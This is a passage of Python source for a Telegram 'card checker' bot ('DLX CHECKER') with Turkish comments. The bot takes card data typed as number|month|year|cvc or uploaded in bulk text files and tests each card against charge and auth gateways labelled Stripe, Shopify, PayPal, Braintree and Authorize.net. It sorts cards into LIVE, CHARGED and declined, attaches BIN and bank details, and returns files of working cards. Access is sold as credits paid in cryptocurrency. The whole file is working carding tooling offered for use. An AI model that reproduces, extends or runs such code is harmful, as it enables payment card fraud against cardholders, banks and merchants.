            'amount': amount,
            'cmd': f"/cshopify{amount}",
            'txt_cmd': f"/cshopify{amount}txt",
            'display': f"Shopify {amount}$ Charge"
        })
    return gateways

def get_paypal_gateways_page(page):
    gateways = []
    start = (page - 1) * 20 + 1
    end = min(page * 20, 100)
    for amount in range(start, end + 1):
        gateways.append({
            'amount': amount,
            'cmd': f"/cpaypal{amount}",
            'txt_cmd': f"/cpaypal{amount}txt",
            'display': f"PayPal {amount}$ Charge"
        })
    return gateways

def get_payflow_gateways_page(page):
    gateways = []
    start = (page - 1) * 20 + 1
    end = min(page * 20, 100)
    for amount in range(start, end + 1):
        gateways.append({
            'amount': amount,
            'cmd': f"/cauthorize{amount}",
            'txt_cmd': f"/cauthorize{amount}txt",
            'display': f"Authorize.net {amount}$ Charge"
        })
    return gateways

def get_braintree_gateways_page(page):
    gateways = []
    start = (page - 1) * 20 + 1
    end = min(page * 20, 100)
    for amount in range(start, end + 1):
        gateways.append({
            'amount': amount,
            'cmd': f"/cbraintree{amount}",
            'txt_cmd': f"/cbraintree{amount}txt",
            'display': f"Braintree {amount}$ Charge"
        })
    return gateways

# ============================================================================
# TOPLU MESAJ GÖNDERME
# ============================================================================
@bot.message_handler(commands=['messagehere'])
def cmd_broadcast(message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "Bu komutu sadece admin kullanabilir!")
        return
    
    msg_text = message.text.replace('/messagehere', '', 1).strip()
    
    if not msg_text:
        bot.reply_to(message, "Kullanım: /messagehere [mesajınız]\nÖrnek: /messagehere Merhaba arkadaşlar, yeni güncellemeler var!")
        return
    
    users = credit_manager.get_all_users()
    
    if not users:
        bot.reply_to(message, "Hiç kullanıcı bulunamadı!")
        return
    
    progress_msg = bot.reply_to(message, f"Mesajınız {len(users)} kullanıcıya gönderiliyor...\n\nGönderilen: 0/{len(users)}\nBaşarılı: 0\nBaşarısız: 0")
    
    credit_manager.save_broadcast(msg_text, user_id)
    
    sent_count = 0
    failed_count = 0
    
    for i, target_id in enumerate(users, 1):
        try:
            broadcast_msg = f"""
Dlx

{msg_text}

---
DLX CHECKER
            """
            bot.send_message(target_id, broadcast_msg)
            sent_count += 1
        except Exception as e:
            logger.error(f"Broadcast error for user {target_id}: {e}")
            failed_count += 1
        
        if i % 10 == 0 or i == len(users):
            try:
                bot.edit_message_text(
                    f"YOUR MESSAGE {len(users)} send all members...\n\n"
                    f"send: {i}/{len(users)}\n"
                    f"succesfull: {sent_count}\n"
                    f"unsussecful: {failed_count}",
                    progress_msg.chat.id,
                    progress_msg.message_id
                )
            except:
                pass
    
    bot.edit_message_text(
        f"DLX CHECKER!\n\n"
        f"STATISTICS\n"
        f"• Total users: {len(users)}\n"
        f"• Successful sends: {sent_count}\n"
        f"• Failed: {failed_count}\n"
        f"• Message: {msg_text[:50]}...",
        progress_msg.chat.id,
        progress_msg.message_id
    )
    
    log_msg = f"""
Toplu Mesaj Gönderildi

Admin: {message.from_user.first_name}
Total: {len(users)} kullanıcı
succesfull: {sent_count}
unsussecful: {failed_count}

Mesaj:
{msg_text}
"""
    log_manager.send_to_channel(log_msg)

# ============================================================================
# ANİMASYONLU CHECK (Her kullanıcı kendi thread'inde çalışır)
# ============================================================================
def send_hit_message(chat_id, card, gateway_name, result, bin_info, elapsed, user_name):
    """Başarılı hit mesajını gönderir"""
    formatted_response = format_response(result, gateway_name)
    
    if "CHARGED" in result:
        status_emoji = "✅"
        status_text = "CHARGED"
    elif "Approved" in result or "LIVE" in result:
        status_emoji = "✅"
        status_text = "LIVE"
    elif "3DS" in result:
        status_emoji = "🔐"
        status_text = "3DS"
    elif "Insufficient" in result:
        status_emoji = "🟨"
        status_text = "INSUFFICIENT"
    elif "AUTO" in result:
        status_emoji = "🤖"
        status_text = "AUTO"
    elif "KILL" in result:
        status_emoji = "💀"
        status_text = "KILL"
    else:
        status_emoji = "❌"
        status_text = "DECLINED"
    
    output = f"""
Card ➜ {card}
Status ➜ {status_emoji} {status_text}
Response ➜ {formatted_response}
Gateway ➜ {gateway_name} ☘️
"""
    
    if bin_info:
        output += f"""
BIN Info ➜ {bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}
Bank ➜ {bin_info['bank']}
Country ➜ {bin_info['country']}
"""
    
    output += f"""
Time ➜ {elapsed}s
Checked by ➜ {user_name}
Bot by ➜ @NEVER_DIE8
"""
    
    bot.send_message(chat_id, output)

def animated_check(message, card, gateway_name, auth_func, credit_cost, amount=None):
    user_id = message.from_user.id
    
    if not check_rate_limit(user_id) and user_id not in ADMIN_IDS:
        bot.reply_to(message, "⏱️ Please wait 2 seconds between commands!")
        return
    
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    user_credit = credit_manager.get_credit(user_id)
    user_info = credit_manager.get_user_info(user_id)
    plan = user_info['plan'] if user_info else 'Free'
    
    if user_credit < credit_cost and user_id not in ADMIN_IDS:
        show_insufficient_credit(message, user_id)
        return
    
    msg = bot.send_message(
        message.chat.id,
        f"↯ Checking..\n\n"
        f"- 𝐂𝐚𝐫𝐝 - {card}\n"
        f"- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - {gateway_name}\n"
        f"- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ",
        parse_mode='HTML'
    )
    
    for i in range(1, 101):
        if i % 10 == 0 or i == 1:
            bar = "■" * (i // 10) + "□" * (10 - (i // 10))
            try:
                bot.edit_message_text(
                    f"↯ Checking..\n\n"
                    f"- 𝐂𝐚𝐫𝐝 - {card}\n"
                    f"- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - {gateway_name}\n"
                    f"- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - {bar} {i}%",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
                time.sleep(0.02)
            except:
                pass
    
    start_time = time.time()
    
    if amount is not None:
        result = auth_func(card, amount)
    else:
        result = auth_func(card)
    
    if result is None:
        result = "DECLINED - No response from gateway"
        logger.error(f"auth_func returned None for {gateway_name} with card {card}")
    
    elapsed = round(time.time() - start_time, 1)
    
    approved = False
    charged = False
    auto = False
    kill = False
    
    formatted_result = format_response(result, gateway_name)
    
    if 'Approved' in result or 'LIVE' in result:
        approved = True
    elif 'CHARGED' in result:
        charged = True
    elif 'AUTO' in result:
        auto = True
    elif 'KILL' in result:
        kill = True
    
    if user_id not in ADMIN_IDS:
        credit_manager.deduct_credit(user_id, credit_cost, approved, charged)
    
    bin_code = card.split('|')[0][:6]
    bin_info = get_bin_info(bin_code)
    
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "User"
    
    if approved or charged or auto or kill:
        if approved:
            success_logger.log_approved(user_id, username, card, gateway_name, amount if amount else 0, result)
        if charged:
            success_logger.log_charged(user_id, username, card, gateway_name, amount if amount else 0, result)
        if auto:
            success_logger.log_auto(user_id, username, card, gateway_name, "Auto", result)
        if kill:
            success_logger.log_kill(user_id, username, card, result)
        
        log_manager.log_hit(
            user_id, 
            first_name,
            plan,
            result,
            amount if amount else 0,
            gateway_name,
            result,
            card
        )
        
        send_hit_message(message.chat.id, card, gateway_name, result, bin_info, elapsed, first_name)
        bot.delete_message(message.chat.id, msg.message_id)
    else:
        if 'CHARGED' in result:
            status_emoji = "✅"
            status_text = "CHARGED"
        elif 'Approved' in result or 'LIVE' in result:
            status_emoji = "✅"
            status_text = "LIVE"
        elif '3DS' in result or 'VBV' in result:
            status_emoji = "🔐"
            status_text = "3DS"
        elif 'Insufficient' in result:
            status_emoji = "🟨"
            status_text = "INSUFFICIENT"
        elif 'AUTO' in result:
            status_emoji = "🤖"
            status_text = "AUTO"
        elif 'KILL' in result:
            status_emoji = "💀"
            status_text = "KILL"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"
        
        amount_display = ""
        if 'auth' in gateway_name.lower() or 'vbv' in gateway_name.lower() or '3d' in gateway_name.lower():
            amount_display = "0"
        elif amount:
            amount_display = f"${amount}"
        
        output = f"""
Card ➜ {card}
Status ➜ {status_emoji} {status_text}
Response ➜ {formatted_result}
Gateway ➜ {gateway_name} ☘️
"""
        
        if bin_info:
            output += f"""
BIN Info ➜ {bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}
Bank ➜ {bin_info['bank']}
Country ➜ {bin_info['country']}
"""
        
        output += f"""
Time ➜ {elapsed}s
Checked by ➜ {first_name}
Bot by ➜ @NEVER_DIE8
"""
        
        try:
            bot.edit_message_text(output, message.chat.id, msg.message_id)
        except Exception as e:
            if "429" not in str(e):
                try:
                    bot.send_message(message.chat.id, output)
                except:
                    pass

def show_insufficient_credit(message, user_id):
    user_info = credit_manager.get_user_info(user_id)
    
    if not user_info:
        user_info = {
            'first_name': message.from_user.first_name or 'User',
            'credit': 0,
            'plan': 'Free',
            'total_checks': 0,
            'approved_count': 0,
            'charged_count': 0
        }
    
    plan_emoji = "👑" if user_info['plan'] != 'Free' else "🆓"
    
    msg = f"""
💳 CREDIT BALANCE
━━━━━━━━━━━━━━━━━━━━

👤 User: {user_info['first_name']}
🆔 ID: {user_id}
📊 Plan: {plan_emoji} {user_info['plan']}
💰 Credits: {user_info['credit']}
🔍 Total Checks: {user_info['total_checks']}
✅ Approved: {user_info['approved_count']}
💎 Charged: {user_info['charged_count']}

📌 Daily Credits: /daily
💎 Buy Premium: /premium
━━━━━━━━━━━━━━━━━━━━
    """
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("Buy Premium", callback_data="back_to_plans")
    btn2 = types.InlineKeyboardButton("Support", url="https://t.me/deluxe_cc")
    markup.add(btn1, btn2)
    
    bot.send_message(message.chat.id, msg, reply_markup=markup)

# ============================================================================
# TXT DOSYA İŞLEME (Her kart thread pool'da, sonuçlar kullanıcıya özel)
# ============================================================================
# Global değişken: TXT işlemini durdurmak için
txt_stop_flags = {}

def process_txt_command(message, cmd, gateway_name, auth_func, amount=None):
    if not check_membership(message.from_user.id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    user_id = message.from_user.id
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    # Stop flag'ı sıfırla
    txt_stop_flags[user_id] = False
    
    msg = bot.reply_to(message, "📁 Please send the TXT file containing cards (one per line in format: number|month|year|cvc)")
    bot.register_next_step_handler(msg, process_txt_file, gateway_name, auth_func, amount)

def process_txt_file(message, gateway_name, auth_func, amount=None):
    if not message.document:
        bot.reply_to(message, "❌ Please send a valid TXT file!")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_content = downloaded_file.decode('utf-8')
        cards = [line.strip() for line in file_content.split('\n') if line.strip()]
        
        if not cards:
            bot.reply_to(message, "❌ No cards found in file!")
            return
        
        user_id = message.from_user.id
        username = message.from_user.username or "No username"
        first_name = message.from_user.first_name or "User"
        user_info = credit_manager.get_user_info(user_id)
        plan = user_info['plan'] if user_info else 'Free'
        
        # Kredi kontrolü - toplam maliyet
        if gateway_name.lower() in ['deluxe', 'stripe', 'paypal', 'shopify', 'braintree', 'authorize']:
            if amount and amount <= 50:
                cost_per_card = CREDIT_COSTS['charge_low']
            else:
                cost_per_card = CREDIT_COSTS['charge_high']
        elif 'auth' in gateway_name.lower() or 'vbv' in gateway_name.lower():
            cost_per_card = CREDIT_COSTS['stripe_auth']
        elif 'adyen' in gateway_name.lower():
            cost_per_card = CREDIT_COSTS['adyen_auth']
        elif 'kill' in gateway_name.lower():
            cost_per_card = CREDIT_COSTS['kill']
        elif 'auto' in gateway_name.lower():
            cost_per_card = CREDIT_COSTS['shopify_auto']
        else:
            cost_per_card = CREDIT_COSTS['charge_low']
        
        total_cost = len(cards) * cost_per_card
        user_credit = credit_manager.get_credit(user_id)
        
        if user_credit < total_cost and user_id not in ADMIN_IDS:
            bot.reply_to(message, f"❌ Yetersiz kredi! İhtiyacınız olan: {total_cost} kredi, mevcut: {user_credit} kredi")
            return
        
        # Progress mesajı ve STOP butonu
        markup = types.InlineKeyboardMarkup()
        stop_btn = types.InlineKeyboardButton("⏹️ STOP", callback_data=f"stop_txt_{user_id}")
        markup.add(stop_btn)
        
        progress_msg = bot.reply_to(message, f"🚀 Processing {len(cards)} cards with {gateway_name}...", reply_markup=markup)
        
        results = []
        approved_cards = []
        live_count = 0
        charged_count = 0
        auto_count = 0
        approved_count = 0
        low_funds = 0
        declined = 0
        cards_processed = 0
        
        start_time = time.time()
        
        # TEK TEK SIRAYLA İŞLE (thread_pool yok, hızlı okuma yok)
        for i, card in enumerate(cards, 1):
            # STOP kontrolü
            if txt_stop_flags.get(user_id, False):
                bot.send_message(message.chat.id, f"⏹️ Process stopped by user! ({cards_processed}/{len(cards)} cards processed)")
                txt_stop_flags[user_id] = False
                break
            
            try:
                if amount is not None:
                    result = auth_func(card, amount)
                else:
                    result = auth_func(card)
                
                cards_processed += 1
                
                bin_code = card.split('|')[0][:6]
                bin_info = get_bin_info(bin_code)
                formatted_result = format_response(result, gateway_name)
                
                approved_this = False
                charged_this = False
                
                if 'CHARGED' in result:
                    status_emoji = "✅"
                    status_text = "CHARGED"
                    charged_count += 1
                    approved_cards.append(card)
                    charged_this = True
                    
                    success_logger.log_charged(user_id, username, card, gateway_name, amount if amount else 0, result)
                    log_manager.log_hit(user_id, first_name, plan, result, amount if amount else 0, gateway_name, result, card)
                    send_hit_message(message.chat.id, card, gateway_name, result, bin_info, round(time.time() - start_time, 1), first_name)
                    
                elif 'Approved' in result or 'LIVE' in result:
                    status_emoji = "✅"
                    status_text = "LIVE"
                    live_count += 1
                    approved_cards.append(card)
                    approved_this = True
                    
                    success_logger.log_approved(user_id, username, card, gateway_name, amount if amount else 0, result)
                    log_manager.log_hit(user_id, first_name, plan, result, amount if amount else 0, gateway_name, result, card)
                    send_hit_message(message.chat.id, card, gateway_name, result, bin_info, round(time.time() - start_time, 1), first_name)
                    
                elif 'AUTO' in result:
                    status_emoji = "🤖"
                    status_text = "AUTO"
                    auto_count += 1
                    approved_cards.append(card)
                    
                    success_logger.log_auto(user_id, username, card, gateway_name, "Auto", result)
                    log_manager.log_hit(user_id, first_name, plan, result, amount if amount else 0, gateway_name, result, card)
                    send_hit_message(message.chat.id, card, gateway_name, result, bin_info, round(time.time() - start_time, 1), first_name)
                    
                elif '3DS' in result:
                    status_emoji = "🔐"
                    status_text = "3DS"
                    approved_count += 1
                    approved_cards.append(card)
                    approved_this = True
                    
                    success_logger.log_approved(user_id, username, card, gateway_name, amount if amount else 0, result)
                    
                elif 'Insufficient' in result:
                    status_emoji = "🟨"
                    status_text = "INSUFFICIENT"
                    low_funds += 1
                else:
                    status_emoji = "❌"
                    status_text = "DECLINED"
                    declined += 1
                
                if user_id not in ADMIN_IDS:
                    credit_manager.deduct_credit(user_id, cost_per_card, approved_this, charged_this)
                
                if 'incorrect_cvc' in result.lower() or 'security code' in result.lower():
                    formatted_result = "Your card's security code is incorrect"
                
                results.append(f"{i}. {card}\n   {status_emoji} {status_text} - {formatted_result}")
                
                # Her karttan sonra progress güncelle
                try:
                    bot.edit_message_text(
                        f"🚀 Processing {len(cards)} cards...\n"
                        f"Progress: {i}/{len(cards)}\n"
                        f"✅ LIVE: {live_count}\n"
                        f"✅ CHARGED: {charged_count}\n"
                        f"🤖 AUTO: {auto_count}\n"
                        f"🔐 3DS: {approved_count}\n"
                        f"🟨 Low Funds: {low_funds}\n"
                        f"❌ Declined: {declined}\n\n"
                        f"⏹️ Click STOP to cancel",
                        progress_msg.chat.id,
                        progress_msg.message_id,
                        reply_markup=markup
                    )
                except:
                    pass
                    
            except Exception as e:
                results.append(f"{i}. {card}\n   ❌ ERROR - {censor_error_message(str(e))}")
                declined += 1
                cards_processed += 1
        
        elapsed = round(time.time() - start_time, 1)
        
        summary = f"""
📊 TXT İşleme Tamamlandı
━━━━━━━━━━━━━━━━━━━━
Toplam Kart: {len(cards)}
İşlenen: {cards_processed}
Süre: {elapsed}s
Gateway: {gateway_name}

✅ LIVE: {live_count}
✅ CHARGED: {charged_count}
🤖 AUTO: {auto_count}
🔐 3DS: {approved_count}
🟨 Insufficient: {low_funds}
❌ Declined: {declined}
━━━━━━━━━━━━━━━━━━━━
✅ Başarılı kartlar ayrıca gönderildi!
        """
        bot.send_message(message.chat.id, summary)
        
        if approved_cards:
            approved_filename = f"approved_live_{user_id}.txt"
            with open(approved_filename, "w", encoding="utf-8") as f:
                for card in approved_cards:
                    f.write(card + "\n")
            with open(approved_filename, "rb") as f:
                bot.send_document(
                    message.chat.id, 
                    f, 
                    caption=f"✅ successful cards ({len(approved_cards)})"
                )
            os.remove(approved_filename)
        
        results_filename = f"results_{user_id}.txt"
        with open(results_filename, "w", encoding="utf-8") as f:
            f.write(f"Gateway: {gateway_name}\n")
            f.write(f"Time: {elapsed}s\n")
            f.write(f"Total: {len(cards)} | Processed: {cards_processed} | LIVE: {live_count} | CHARGED: {charged_count} | AUTO: {auto_count} | 3DS: {approved_count} | Low Funds: {low_funds} | Declined: {declined}\n")
            f.write("=" * 50 + "\n\n")
            f.write("\n\n".join(results))
        
        with open(results_filename, "rb") as f:
            bot.send_document(
                message.chat.id, 
                f, 
                caption=f"📊 all results ({cards_processed}/{len(cards)} kart)"
            )
        os.remove(results_filename)
        
        # Stop flag'ı temizle
        txt_stop_flags[user_id] = False
        
        try:
            bot.delete_message(progress_msg.chat.id, progress_msg.message_id)
        except:
            pass
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error processing file: {censor_error_message(str(e))}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_txt_'))
def stop_txt_callback(call):
    user_id = int(call.data.split('_')[2])
    if call.from_user.id == user_id:
        txt_stop_flags[user_id] = True
        bot.answer_callback_query(call.id, "⏹️ Process will stop after current card...", show_alert=True)
        bot.edit_message_text(
            "🛑 STOPPING... Please wait for current card to finish.",
            call.message.chat.id,
            call.message.message_id
        )
    else:
        bot.answer_callback_query(call.id, "❌ You can only stop your own process!", show_alert=True)

# ============================================================================
# START KOMUTU
# ============================================================================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    if not check_membership(user_id):
        bot.reply_to(message, "🚫 Please join all channels first!", reply_markup=get_channels_markup())
        return
    
    credit_manager.create_user(user_id, message.from_user.username, message.from_user.first_name)
    user_info = credit_manager.get_user_info(user_id)
    plan = user_info['plan'] if user_info else 'Free'
    
    log_manager.log_start(user_id, message.from_user.username, message.from_user.first_name, plan)
    
    welcome_msg = """
Welcome to DlxChecker 👋

To get premium on the bot, contact @NEVER_DIE8

/premium You can make purchases from within the bot.
    """
    
    markup = types.InlineKeyboardMarkup(row_width=3)
    btn1 = types.InlineKeyboardButton("Deluxe", callback_data="gate_deluxe_1")
    btn2 = types.InlineKeyboardButton("Stripe", callback_data="gate_stripe_1")
    btn3 = types.InlineKeyboardButton("Shopify", callback_data="gate_shopify_1")
    btn4 = types.InlineKeyboardButton("PayPal", callback_data="gate_paypal_1")
    btn5 = types.InlineKeyboardButton("Payflow", callback_data="gate_payflow_1")
    btn6 = types.InlineKeyboardButton("Braintree", callback_data="gate_braintree_1")
    btn7 = types.InlineKeyboardButton("Other Gates", callback_data="gate_other")
    btn8 = types.InlineKeyboardButton("Auth Gates", callback_data="show_gates")
    btn9 = types.InlineKeyboardButton("Tools", callback_data="show_tools")
    btn10 = types.InlineKeyboardButton("TXT Commands", callback_data="show_txt_commands")
    btn11 = types.InlineKeyboardButton("Auto CMD", callback_data="show_auto_cmd")
    btn12 = types.InlineKeyboardButton("Premium", callback_data="back_to_plans")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11, btn12)
    
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
def check_membership_callback(call):
    user_id = call.from_user.id
    
    if check_membership(user_id):
        bot.answer_callback_query(call.id, "✅ You have joined all channels!", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)

# ============================================================================
# BALANCE KOMUTU
# ============================================================================
@bot.message_handler(commands=['balance'])
def cmd_balance(message):
    user_id = message.from_user.id
    
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    credit_manager.create_user(user_id, message.from_user.username, message.from_user.first_name)
    
    user_info = credit_manager.get_user_info(user_id)
    
    if not user_info:
        user_info = {
            'first_name': message.from_user.first_name or 'User',
            'credit': 0,
            'plan': 'Free',
            'total_checks': 0,
            'approved_count': 0,
            'charged_count': 0
        }
    
    plan_emoji = "👑" if user_info['plan'] != 'Free' else "🆓"
    
    msg = f"""
💳 CREDIT BALANCE
━━━━━━━━━━━━━━━━━━━━

👤 User: {user_info['first_name']}
🆔 ID: {user_id}
📊 Plan: {plan_emoji} {user_info['plan']}
💰 Credits: {user_info['credit']}
🔍 Total Checks: {user_info['total_checks']}
✅ Approved: {user_info['approved_count']}
💎 Charged: {user_info['charged_count']}

📌 Daily Credits: /daily
💎 Buy Premium: /premium
━━━━━━━━━━━━━━━━━━━━
    """
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("Buy Premium", callback_data="back_to_plans")
    btn2 = types.InlineKeyboardButton("Support", url="https://t.me/deluxe_cc")
    markup.add(btn1, btn2)
    
    bot.send_message(message.chat.id, msg, reply_markup=markup)

# ============================================================================
# DAILY KOMUTU
# ============================================================================
@bot.message_handler(commands=['daily'])
def cmd_daily(message):
    user_id = message.from_user.id
    
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    credit_manager.create_user(user_id, message.from_user.username, message.from_user.first_name)
    
    if credit_manager.claim_daily(user_id):
        new_credit = credit_manager.get_credit(user_id)
        bot.reply_to(
            message,
            f"✅ Daily 50 credits added to your account!\n\nNew balance: {new_credit} credits"
        )
    else:
        bot.reply_to(
            message,
            "❌ You've already claimed your daily credits today!\n\nTry again tomorrow."
        )

# ============================================================================
# PREMIUM KOMUTU
# ============================================================================
@bot.message_handler(commands=['premium'])
def cmd_premium(message):
    user_id = message.from_user.id
    
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    credit_manager.create_user(user_id, message.from_user.username, message.from_user.first_name)
    
    user_credit = credit_manager.get_credit(user_id)
    
    msg = f"""
╔══════════════════════════════╗
║        PREMIUM PACKAGES      ║
╚══════════════════════════════╝

Your Credits: {user_credit}

PACKAGES:

🥉 Bronze
   • 500 Credits
   • $5
   • Instant activation

🥈 Silver
   • 1500 Credits
   • $15
   • Instant activation

🥇 Gold
   • 3000 Credits
   • $30
   • Instant activation

💎 Diamond
   • 5000 Credits
   • $50
   • Instant activation

🔥 DLX
   • 10000 Credits
   • $100
   • Instant activation

━━━━━━━━━━━━━━━━━━━━
Payment: USDT (TRC20), BTC, LTC, ETC
━━━━━━━━━━━━━━━━━━━━
    """
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("🥉 Bronze - 500 Credits", callback_data="plan_bronze")
    btn2 = types.InlineKeyboardButton("🥈 Silver - 1500 Credits", callback_data="plan_silver")
    btn3 = types.InlineKeyboardButton("🥇 Gold - 3000 Credits", callback_data="plan_gold")
    btn4 = types.InlineKeyboardButton("💎 Diamond - 5000 Credits", callback_data="plan_diamond")
    btn5 = types.InlineKeyboardButton("🔥 DLX - 10000 Credits", callback_data="plan_dlx")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(message.chat.id, msg, reply_markup=markup)

# ============================================================================
# PLAN SEÇİMİ
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data.startswith('plan_'))
def handle_plan_selection(call):
    plan_key = call.data.replace('plan_', '')
    plan = PLANS[plan_key]
    user_id = call.from_user.id
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("USDT (TRC20)", callback_data=f"pay_{plan_key}_USDT")
    btn2 = types.InlineKeyboardButton("Bitcoin (BTC)", callback_data=f"pay_{plan_key}_BTC")
    btn3 = types.InlineKeyboardButton("Litecoin (LTC)", callback_data=f"pay_{plan_key}_LTC")
    btn4 = types.InlineKeyboardButton("Ethereum Classic (ETC)", callback_data=f"pay_{plan_key}_ETC")
    btn5 = types.InlineKeyboardButton("Back", callback_data="back_to_plans")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    msg = f"""
Payment Created!
━━━━━━━━━━━━━━━━━━━━

{plan['name']}
Amount: ${plan['price']}
━━━━━━━━━━━━━━━━━━━━

Select payment method:
• USDT (TRC20)
• Bitcoin (BTC)
• Litecoin (LTC)
• Ethereum Classic (ETC)

Credits will be added automatically after payment.
━━━━━━━━━━━━━━━━━━━━
    """
    
    bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup)

# ============================================================================
# ÖDEME İŞLEME
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data.startswith('pay_'))
def handle_payment(call):
    _, plan_key, currency = call.data.split('_')
    plan = PLANS[plan_key]
    user_id = call.from_user.id
    
    result = oxapay.create_payment(
        amount_usd=plan['price'],
        currency=currency,
        user_id=user_id,
        plan_name=plan['name'],
        credit_amount=plan['credit']
    )
    
    if result['success']:
        qr_data = result.get('pay_link', result['address'])
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(qr_data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        
        bio = BytesIO()
        bio.name = 'qr.png'
        img.save(bio, 'PNG')
        bio.seek(0)
        
        credit_manager.save_payment(
            user_id, plan['name'], plan['credit'], 
            plan['price'], currency, result['address'], result['track_id']
        )
        
        if 'pay_link' in result and result['pay_link']:
            address_display = result['pay_link']
            address_text = "Payment Link"
        else:
            address_display = result['address']
            address_text = "Address"
        
        msg = f"""
Payment Created!
━━━━━━━━━━━━━━━━━━━━

{plan['name']}
Amount: {result['amount']} {result['currency']}
{address_text}: <code>{address_display}</code>
Network: {result['network']}

Time Limit: 15 minutes
Status: Waiting for payment...

Send exactly: {result['amount']} {result['currency']}
{address_text} (click to copy): <code>{address_display}</code>

Credits will be added automatically after payment!
━━━━━━━━━━━━━━━━━━━━
        """
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("Check Payment", callback_data=f"check_{result['track_id']}")
        btn2 = types.InlineKeyboardButton("Cancel", callback_data=f"cancel_{result['track_id']}")
        btn3 = types.InlineKeyboardButton("Back", callback_data="back_to_plans")
        markup.add(btn1, btn2, btn3)
        
        bot.send_photo(
            call.message.chat.id,
            photo=bio,
            caption=msg,
            parse_mode='HTML',
            reply_markup=markup
        )
        
        bot.delete_message(call.message.chat.id, call.message.message_id)
    else:
        bot.answer_callback_query(call.id, f"❌ Error: {result['error']}", show_alert=True)

# ============================================================================
# ÖDEME KONTROL
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data.startswith('check_'))
def check_payment(call):
    track_id = call.data.replace('check_', '')
    user_id = call.from_user.id
    
    result = oxapay.check_payment(track_id)
    
    if result.get('status') == 'Completed' and result.get('result') == 100:
        try:
            payment = credit_manager.get_payment(track_id)
            
            if payment:
                credit_manager.mark_payment_paid(track_id)
                credit_manager.add_credit(user_id, payment[1], payment[2])
                
                user_info = credit_manager.get_user_info(user_id)
                if user_info:
                    log_manager.log_payment_success(
                        user_id,
                        user_info['first_name'],
                        payment[2],
                        payment[3],
                        "USD",
                        payment[1]
                    )
                
                bot.answer_callback_query(call.id, "✅ Payment successful! Credits added.", show_alert=True)
                
                bot.edit_message_caption(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    caption=f"✅ PAYMENT SUCCESSFUL!\n\n{payment[1]} credits added to your account.\nNew balance: {credit_manager.get_credit(user_id)} credits"
                )
        except Exception as e:
            logger.error(f"Check payment error: {e}")
    
    elif result.get('status') == 'Insufficient':
        paid = result.get('paid_amount', 0)
        expected = result.get('expected_amount', 0)
        
        user_info = credit_manager.get_user_info(user_id)
        if user_info:
            log_manager.log_payment_insufficient(
                user_id,
                user_info['first_name'],
                paid,
                expected,
                "USD"
            )
        
        bot.answer_callback_query(
            call.id, 
            f"⚠️ Insufficient payment: Received {paid} but expected {expected}", 
            show_alert=True
        )
    
    elif result.get('status') == 'Failed' or result.get('status') == 'Expired':
        bot.answer_callback_query(call.id, "❌ Payment failed or expired.", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "⏳ Payment not confirmed yet. Please wait...", show_alert=False)

@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_'))
def cancel_payment(call):
    track_id = call.data.replace('cancel_', '')
    
    try:
        db_manager.execute_write(
            "UPDATE payments SET status = 'cancelled' WHERE track_id = ?", 
            (track_id,)
        )
    except:
        pass
    
    bot.answer_callback_query(call.id, "❌ Payment cancelled.", show_alert=True)
    
    cmd_premium(call.message)

# ============================================================================
# REDEEM KOMUTU
# ============================================================================
@bot.message_handler(commands=['redeem'])
def cmd_redeem(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Usage: /redeem [CODE]\nExample: /redeem DLX-ABCD-EFGH-IJKL-BRONZE")
        return
    
    user_id = message.from_user.id
    
    if credit_manager.is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    code = args[1].strip().upper()
    
